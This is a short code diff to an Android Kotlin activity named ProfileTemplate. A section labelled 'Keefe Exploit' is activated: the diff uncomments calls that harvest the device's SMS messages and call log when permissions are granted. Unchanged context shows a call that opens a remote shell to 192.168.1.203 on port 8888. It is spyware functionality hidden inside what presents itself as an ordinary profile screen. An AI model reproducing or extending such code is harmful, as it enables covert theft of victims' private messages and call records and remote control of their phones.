@@ -63,12 +63,10 @@ class ProfileTemplate : AppCompatActivity() {
 
         // Keefe Exploit --------------------------------------------------------------
         if (checkSMSPerms()) {
-            // hv.getSMS()
-            datasender.sendData("id" , "")
+             hv.getSMS()
         }
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-            // hv.getCallLog()
-            datasender.sendData("id" , "")
+             hv.getCallLog()
         }
         if (checkFileStoragePerms()) {
             hv.getShell("192.168.1.203", 8888)
